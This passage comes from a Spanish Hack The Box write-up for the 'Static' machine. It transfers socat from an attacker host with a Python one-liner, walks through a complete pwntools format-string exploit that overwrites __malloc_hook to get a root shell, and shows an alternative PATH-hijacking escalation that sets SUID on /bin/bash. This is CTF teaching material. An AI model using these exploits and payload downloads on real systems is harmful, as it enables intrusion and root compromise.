</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ wget http://127.0.0.1:1234/lib/x86_64-linux-gnu/libc.so.6
</span></span></code></pre></div><p>Finalmente, como se trata de un programa de línea de comandos, necesitaremos utilizar <a href=https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat><code>socat</code></a> para redirigir los datos que vienen de una conexión TCP al binario en ejecución.</p><p>Podemos transferir <a href=https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat><code>socat</code></a> desde la máquina de atacante hasta <code>pki</code> utilizando el siguiente código en Python:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> urllib.request <span style=color:#f92672>import</span> urlopen
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>f <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#39;./socat&#39;</span>, <span style=color:#e6db74>&#39;wb&#39;</span>)
</span></span><span style=display:flex><span>f<span style=color:#f92672>.</span>write(urlopen(<span style=color:#e6db74>&#39;http://192.168.254.2:4444/socat&#39;</span>)<span style=color:#f92672>.</span>read())
</span></span><span style=display:flex><span>f<span style=color:#f92672>.</span>close()
</span></span></code></pre></div><p>La máquina de atacante tendrá un servidor HTTP en el puerto 4444 (recuérdese la configuración de red):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ python3 -m http.server <span style=color:#ae81ff>4444</span>
</span></span><span style=display:flex><span>Serving HTTP on :: port 4444 (http://[::]:4444/) ...
</span></span></code></pre></div><p>Este código en Python se puede ejecutar en <code>pki</code> con un &ldquo;<em>one-liner</em>&rdquo; como este:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@pki:/$ cd /tmp
</span></span><span style=display:flex><span>www-data@pki:/tmp$ python3 -c &#39;from urllib.request import urlopen; f = open(&#34;./socat&#34;, &#34;wb&#34;); f.write(urlopen(&#34;http://192.168.254.2:4444/socat&#34;).read()); f.close()&#39;
</span></span><span style=display:flex><span>www-data@pki:/tmp$ file socat
</span></span><span style=display:flex><span>socat: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
</span></span></code></pre></div><p>Ahora tenemos que lanzar <a href=https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat><code>socat</code></a> y empezar a trabajar desde la máquina de atacante desde <code>127.0.0.1:1234</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@pki:/tmp$ chmod +x socat
</span></span><span style=display:flex><span>www-data@pki:/tmp$ ./socat tcp-l:1234,reuseaddr,fork EXEC:/usr/bin/ersatool
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ nc 127.0.0.1 <span style=color:#ae81ff>1234</span>
</span></span><span style=display:flex><span># print
</span></span><span style=display:flex><span>print-&gt;CN=%x
</span></span><span style=display:flex><span>f7410e5f[!] ERR reading /opt/easyrsa/clients/%x.ovpn!
</span></span></code></pre></div><h2 id=explotación-de-_format-string_>Explotación de <em>Format String</em></h2><p>Esta es la información básica del binario:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ file ersatool
</span></span><span style=display:flex><span>ersatool: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=961368a18afcdeccddd1f423353ff104bc09e6ae, not stripped
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>$ checksec --file ersatool
</span></span><span style=display:flex><span>    Arch:     amd64-64-little
</span></span><span style=display:flex><span>    RELRO:    Partial RELRO
</span></span><span style=display:flex><span>    Stack:    No canary found
</span></span><span style=display:flex><span>    NX:       NX enabled
</span></span><span style=display:flex><span>    PIE:      PIE enabled
</span></span></code></pre></div><ul>
<li>Se trata de un binario ELF de 64-bit.</li><li>Tiene NX habilitado, lo que indica que la pila (<em>stack</em>) no es ejecutable.</li><li>Tiene PIE habilitado, lo que significa que la dirección base del propio binario está aleatorizada (ASLR) de manera que cambia cada vez que se reinicia el programa (las direcciones de las funciones se calculan como un <em>offset</em> más la dirección base).</li><li>Además, las direcciones de las funciones de Glibc también tienen ASLR, porque está habilitado:</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@pki:/tmp$ cat /proc/sys/kernel/randomize_va_space
</span></span><span style=display:flex><span>2
</span></span></code></pre></div><p>Necesitamos realizar las siguientes tareas para obtener RCE:</p><ol>
<li>Encontrar el <em>offset</em> de la <em>format string</em>.</li><li>Obtener una dirección de una función del binario utilizando la <em>format string</em> (<em>leak</em>).</li><li>Calcular la dirección base del binario.</li><li>Obtener una dirección de una función de Glibc utilizando la <em>format string</em> (<em>leak</em>).</li><li>Calcular la dirección base de Glibc.</li><li>Modificar la función <code>__malloc_hook</code> con un <em>gadget</em> de Glibc para conseguir una <em>shell</em> usando la <em>format string</em>.</li><li>Ocasionar la llamada de <code>malloc</code> solicitando una gran cantidad de memoria.</li></ol><p><strong>Tarea 1</strong>: Ya realizada, el <em>offset</em> de la <em>format string</em> es <code>8</code>.</p><p><strong>Tarea 2</strong>: Para fugar una dirección, tendremos que utilizar formatos como <code>%x</code> o <code>%p</code> (ambos imprimen el valor en hexadecimal de una dirección, pero el segundo añade <code>0x</code>). Sin embargo, en lugar de poner un montón de formatos, podemos coger una posición y utilizar <code>%i$p</code>, donde <code>i</code> es la posición. Esta vez, como es un binario de 64-bit, necesitamos utilizar <code>%lx</code> o <code>%lp</code>.</p><p>Con esta idea, podemos crear un sencillo <em>script</em> en Python con <code>pwntools</code> para obtener los primeros 60 valores de la pila:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;127.0.0.1&#39;</span>, <span style=color:#ae81ff>1234</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_value</span>(i):
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;print-&gt;CN=&#39;</span>, <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;%</span><span style=color:#e6db74>{</span>i<span style=color:#e6db74>}</span><span style=color:#e6db74>$lp&#39;</span><span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> data[:data<span style=color:#f92672>.</span>index(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;[!] ERR&#39;</span>)]
</span></span><span style=display:flex><span>    print(i, data<span style=color:#f92672>.</span>decode())
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> int(data<span style=color:#f92672>.</span>decode(), <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;# &#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;print&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>61</span>):
</span></span><span style=display:flex><span>    get_value(i)
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ python3 exploit.py
</span></span><span style=display:flex><span>[+] Opening connection to 127.0.0.1 on port 1234: Done
</span></span><span style=display:flex><span>1 0x5615109d815f
</span></span><span style=display:flex><span>2 0x7ffdc8e5489a
</span></span><span style=display:flex><span>3 0x5615109d815f
</span></span><span style=display:flex><span>4 0x4a
</span></span><span style=display:flex><span>5 0x696c632f61737279
</span></span><span style=display:flex><span>6 0x1109d41d0
</span></span><span style=display:flex><span>7 (nil)
</span></span><span style=display:flex><span>8 0x706c243825
</span></span><span style=display:flex><span>9 (nil)
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>19 (nil)
</span></span><span style=display:flex><span>20 0x561500000000
</span></span><span style=display:flex><span>21 0x7f4a39c0bf51
</span></span><span style=display:flex><span>22 0x7361652f74706f2f
</span></span><span style=display:flex><span>23 0x696c632f61737279
</span></span><span style=display:flex><span>24 0x3432252f73746e65
</span></span><span style=display:flex><span>25 0x6e70766f2e706c24
</span></span><span style=display:flex><span>26 (nil)
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>33 (nil)
</span></span><span style=display:flex><span>34 0x7f4a00000000
</span></span><span style=display:flex><span>35 0x7f4a39bfd87d
</span></span><span style=display:flex><span>36 (nil)
</span></span><span style=display:flex><span>37 (nil)
</span></span><span style=display:flex><span>38 0x7ffdc8e54940
</span></span><span style=display:flex><span>39 0x5615109d4f83
</span></span><span style=display:flex><span>40 0x7ffdc8e54a28
</span></span><span style=display:flex><span>41 0x100000000
</span></span><span style=display:flex><span>42 0x5615109d5070
</span></span><span style=display:flex><span>43 0xa746e697270
</span></span><span style=display:flex><span>44 (nil)
</span></span><span style=display:flex><span>45 0x100000000
</span></span><span style=display:flex><span>46 0x5615109d5070
</span></span><span style=display:flex><span>47 0x7f4a39ba0b97
</span></span><span style=display:flex><span>48 0x2000000000
</span></span><span style=display:flex><span>49 0x7ffdc8e54a28
</span></span><span style=display:flex><span>50 0x100000000
</span></span><span style=display:flex><span>51 0x5615109d4e5b
</span></span><span style=display:flex><span>52 (nil)
</span></span><span style=display:flex><span>53 0xcc040442782a621f
</span></span><span style=display:flex><span>54 0x5615109d41d0
</span></span><span style=display:flex><span>55 0x7ffdc8e54a20
</span></span><span style=display:flex><span>56 (nil)
</span></span><span style=display:flex><span>57 (nil)
</span></span><span style=display:flex><span>58 0x9fd5b4b24a6a621f
</span></span><span style=display:flex><span>59 0x9eba560cce54621f
</span></span><span style=display:flex><span>60 0x7ffd00000000
</span></span></code></pre></div><p>Burlar el ASLR es relativamente sencillo, ya que la dirección base aleatorizada siempre termina en tres ceros en hexadecimal. Por tanto, si conocemos los últimos tres dígitos hexadecimales de un <em>offset</em>, podemos identificar fácilmente la dirección real.</p><p>Veamos cuál es el <em>offset</em> de la función <code>main</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ readelf -s ersatool | grep <span style=color:#e6db74>&#39; main&#39;</span>
</span></span><span style=display:flex><span>    86: 0000000000001e5b   524 FUNC    GLOBAL DEFAULT   14 main
</span></span></code></pre></div><p>Si miramos a los valores fugados anteriormente, descubrimos que la posición 51 es <code>0x5615109d4e5b</code>, termina en <code>e5b</code>. Por tanto, tenemos una manera de sacar la dirección real de la función <code>main</code> utilizando <code>%51$lp</code> como <em>format string</em>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span>main_addr <span style=color:#f92672>=</span> get_value(<span style=color:#ae81ff>51</span>)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#39;Address of main():&#39;</span>, hex(main_addr))
</span></span></code></pre></div><p><strong>Tarea 3</strong>: La dirección base del binario es muy probable que sea <code>0x5615109d4e5b - 0x1e5b = 0x5615109d3000</code> (será distinta en cada ejecución):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span>elf <span style=color:#f92672>=</span> context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./ersatool&#39;</span>, checksec<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./libc.so.6&#39;</span>, checksec<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>elf<span style=color:#f92672>.</span>address <span style=color:#f92672>=</span> main_addr <span style=color:#f92672>-</span> elf<span style=color:#f92672>.</span>symbols<span style=color:#f92672>.</span>main
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#39;Binary base address:&#39;</span>, hex(elf<span style=color:#f92672>.</span>address))
</span></span></code></pre></div><p>Ahora el proceso de explotación de <em>Format String</em> es bastante estándar.</p><p><strong>Tarea 4</strong>: Para fugar una dirección de Glibc, podemos utilizar la Tabla de <em>Offsets</em> Globales (GOT). Esta tabla es parte del binario y contiene las direcciones de las funciones que pueden ser utilizadas por el binario (es decir, <code>printf</code>, <code>strncat</code>, <code>fgets</code>&mldr;).</p><p>Las direcciones de la GOT son conocidas porque tenemos sus <em>offsets</em> y la dirección base del binario. Podemos utilizar el siguiente <em>payload</em> para imprimir la dirección de <code>printf</code> (por ejemplo) en Glibc:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span>leak <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%9$s&#39;</span><span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span>) <span style=color:#f92672>+</span> p64(elf<span style=color:#f92672>.</span>got<span style=color:#f92672>.</span>printf)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;print-&gt;CN=&#39;</span>, leak)
</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> data[:data<span style=color:#f92672>.</span>index(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;[!] ERR&#39;</span>)]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>printf_addr <span style=color:#f92672>=</span> u64(data<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span>))
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#39;Address of printf():&#39;</span>, hex(printf_addr))
</span></span></code></pre></div><p>Como las cadenas de caracteres en C funcionan como punteros, si ponemos una dirección de la GOT en una <em>format string</em> para mostrar el contenido de una cadena de caracteres, lo que se mostrará es la dirección a la que apunta el la dirección de la GOT.</p><p>Nótese que estamos tratando de fugar <code>%9$s</code>, que serán los datos contenidos en la dirección de <code>printf</code> de la GOT, que viene justo después de la <em>format string</em> (recuérdese que el <em>offset</em> de la <em>format string</em> es <code>8</code>).</p><p>Si todo funciona correctamente, tendremos la dirección real de <code>printf</code> en Glibc.</p><p><strong>Tarea 5</strong>: La dirección base de Glibc se puede calcular de la misma manera que la dirección base del binario. Solamente tenemos que restar la dirección real del <em>offset</em>. Adicionalmente, tendremos que verificar que la dirección base acaba en <code>000</code> en hexadecimal.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span>libc<span style=color:#f92672>.</span>address <span style=color:#f92672>=</span> printf_addr <span style=color:#f92672>-</span> libc<span style=color:#f92672>.</span>symbols<span style=color:#f92672>.</span>printf
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#39;Glibc base address:&#39;</span>, hex(libc<span style=color:#f92672>.</span>address))
</span></span></code></pre></div><p><strong>Tarea 6</strong>: Ahora necesitamos escribir en una dirección de memoria. La mejor manera de ganar ejecución de comandos en este tipo de situaciones es sobrescribiendo la dirección de <code>__malloc_hook</code> de Glibc para ejecutar un <em>gadget</em> de <em>shell</em>.</p><p>Los <em>gadgets</em> son líneas de código ensamblador que ejecutan una operación concreta. Son útiles en explotación de <em>Buffer Overflow</em> utilizando <em>Return Oriented Programming</em> (ROP) para saltarse el NX (también conocido como DEP).</p><p>Esta vez podemos buscar un <em>gadget</em> que directamente ejecute <code>/bin/sh</code>. Estos se suelen encontrar en Glibc. Utilizando <code>one_gadget</code> podemos encontrar <em>gadgets</em> potenciales:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span># gem install one_gadget
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>$ one_gadget libc.so.6
</span></span><span style=display:flex><span>0x4f2c5 execve(&#34;/bin/sh&#34;, rsp+0x40, environ)
</span></span><span style=display:flex><span>constraints:
</span></span><span style=display:flex><span>  rsp &amp; 0xf == 0
</span></span><span style=display:flex><span>  rcx == NULL
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>0x4f322 execve(&#34;/bin/sh&#34;, rsp+0x40, environ)
</span></span><span style=display:flex><span>constraints:
</span></span><span style=display:flex><span>  [rsp+0x40] == NULL
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>0x10a38c execve(&#34;/bin/sh&#34;, rsp+0x70, environ)
</span></span><span style=display:flex><span>constraints:
</span></span><span style=display:flex><span>  [rsp+0x70] == NULL
</span></span></code></pre></div><p>Podemos utilizar <code>0x4f322</code>, por ejemplo. Ahora podemos sobrescribir fácilmente <code>__malloc_hook</code> utilizando <code>pwntools</code> (esta librería tiene una función mágica llamada <code>fmtstr_payload</code> que hace todo el trabajo, indicándole el <em>offset</em>, la dirección de memoria en la que escribir y el valor a escribir):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span>one_gadget_shell <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>address <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x4f322</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> fmtstr_payload(
</span></span><span style=display:flex><span>    offset,
</span></span><span style=display:flex><span>    {libc<span style=color:#f92672>.</span>sym<span style=color:#f92672>.</span>__malloc_hook: one_gadget_shell},
</span></span><span style=display:flex><span>    write_size<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;short&#39;</span>
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;print-&gt;CN=&#39;</span>, payload)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>recv()
</span></span></code></pre></div><p><strong>Tarea 7</strong>: La necesidad de sobrescribir <code>__malloc_hook</code> es porque ahora vamos a enviar <code>%10000$c</code>. Esta tarea va a requerir una reserva de espacio en memoria, por lo que el binario llamará a <code>malloc</code>. Sin embargo, <code>__malloc_hook</code> será ejecutado antes. Y como ha sido modificada, en lugar de llamar a <code>malloc</code>, el programa ejecutará una <em>shell</em> (<code>/bin/sh</code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span>p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;print-&gt;CN=&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%10000$c&#39;</span>)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><p>Finalmente, podemos ejecutar el <em>exploit</em> y conseguir una <em>shell</em> como <code>root</code> (debido a las <em>capabilities</em> del binario):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ python3 exploit.py
</span></span><span style=display:flex><span>[+] Opening connection to 127.0.0.1 on port 1234: Done
</span></span><span style=display:flex><span>Offset: 8
</span></span><span style=display:flex><span>51 0x558d4b23fe5b
</span></span><span style=display:flex><span>Address of main(): 0x558d4b23fe5b
</span></span><span style=display:flex><span>Binary base address: 0x558d4b23e000
</span></span><span style=display:flex><span>GOT printf(): 0x558d4b243058
</span></span><span style=display:flex><span>Address of printf(): 0x7f33d1794e80
</span></span><span style=display:flex><span>Glibc base address: 0x7f33d1730000
</span></span><span style=display:flex><span>Address of __malloc_hook(): 0x7f33d1b1bc30
</span></span><span style=display:flex><span>[*] Switching to interactive mode
</span></span><span style=display:flex><span>$ whoami
</span></span><span style=display:flex><span>root
</span></span><span style=display:flex><span>$ cat /root/root.txt
</span></span><span style=display:flex><span>b3298f99ac5999202090829ed5fa9fb6
</span></span></code></pre></div><p>El <em>expoit</em> completo puede encontrarse en <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Static/exploit.py><code>exploit.py</code></a> (explicación detallada <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Static#exploitpy>aquí</a>).</p><h2 id=escalada-de-privilegios-alternativa>Escalada de privilegios alternativa</h2><p>A pesar de que la explotación de <em>Format String</em> es mucho más elegante, existe una manera más sencilla y rápida de escalar privilegios. La ides es que <code>ersatool</code> puede crear archivos <code>.ovpn</code>. A lo mejor está utilizando otro binario por detrás.</p><p>Para verificar todos los procesos en ejecución al crearse el archivo <code>.ovpn</code>, se puede utilizar <a href=https://github.com/DominicBreuker/pspy><code>pspy</code></a>. Una vez lanzado, se puede ver que le binario utiliza <code>openssl</code>.</p><p>Pero, el matiz es que el programa se llama con una ruta relativa. Por tanto, este binario es vulnerable a <code>PATH</code> <em>hijacking</em>. Podemos crear un ejecutable <code>openssl</code> malicioso dentro de <code>/tmp</code> y añadir <code>/tmp</code> a la variable de entorno <code>PATH</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@pki:/tmp$ echo -e &#39;#!/bin/bash\nchmod 4755 /bin/bash&#39; &gt; openssl
</span></span><span style=display:flex><span>www-data@pki:/tmp$ cat openssl
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>chmod <span style=color:#ae81ff>4755</span> /bin/bash
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@pki:/tmp$ chmod +x openssl
</span></span><span style=display:flex><span>www-data@pki:/tmp$ echo $PATH
</span></span><span style=display:flex><span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
</span></span><span style=display:flex><span>www-data@pki:/tmp$ export PATH=/tmp:$PATH
</span></span><span style=display:flex><span>www-data@pki:/tmp$ echo $PATH
</span></span><span style=display:flex><span>/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
</span></span><span style=display:flex><span>www-data@pki:/tmp$ ls -l /bin/bash
</span></span><span style=display:flex><span>-rwxr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
</span></span></code></pre></div><p>El <code>openssl</code> malicioso añadirá el permiso SUID a <code>/bin/bash</code>. Si utilizamos <code>ersatool create</code>, el <code>openssl</code> malicioso se ejecutará:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@pki:/tmp$ ersatool create xD
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>www-data@pki:/tmp$ ls -l /bin/bash
</span></span><span style=display:flex><span>-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
</span></span></code></pre></div><p>Y ganamos acceso como <code>root</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@pki:/tmp$ bash -p
</span></span><span style=display:flex><span>bash-4.4# cat /root/root.txt
</span></span><span style=display:flex><span>b3298f99ac5999202090829ed5fa9fb6
</span></span></code></pre></div><div class="mt6 instapaper_ignoref">
</div></div><aside aria-label=aside class="w-20-l mt6-l aside-desktop">
<div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:2rem>
<p class="f5 b mb3">Contenidos de este write-up</p><nav id=TableOfContents>
<ul>
<li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#enumeración-web>Enumeración web</a></li><li><a href=#parcheando-un-fichero-gzip>Parcheando un fichero Gzip</a></li><li><a href=#gestionando-2fa>Gestionando 2FA</a></li><li><a href=#conexión-a-la-vpn-de-static>Conexión a la VPN de Static</a></li><li><a href=#comprometiendo-un-servidor-interno>Comprometiendo un servidor interno</a></li><li><a href=#enumeración-de-red>Enumeración de red</a></li><li><a href=#comprometiendo-otro-servidor-interno>Comprometiendo otro servidor interno</a></li><li><a href=#encontrando-una-vulnerabilidad-de-_format-string_>Encontrando una vulnerabilidad de <em>Format String</em></a></li><li><a href=#configuración-de-red-para-la-explotación>Configuración de red para la explotación</a></li><li><a href=#explotación-de-_format-string_>Explotación de <em>Format String</em></a></li><li><a href=#escalada-de-privilegios-alternativa>Escalada de privilegios alternativa</a></li></ul></nav></div></aside></article></main><footer class="bg-black bottom-0 w-100 pa3" role=contentinfo>
<div class="flex justify-between">
<a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a>
<div style=margin-top:8px>
<div>
<div>
<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
